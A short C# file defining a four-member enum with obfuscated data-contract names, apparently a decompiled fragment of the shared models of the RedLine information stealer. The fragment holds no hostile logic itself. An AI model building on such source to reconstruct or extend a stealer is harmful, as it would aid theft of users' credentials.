using System.Runtime.Serialization;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity13", Namespace = "Entity")]
public enum ApiResponse : byte
{
	[EnumMember]
	Id1,
	[EnumMember]
	Id2,
	[EnumMember]
	Id3,
	[EnumMember]
	Id4
}
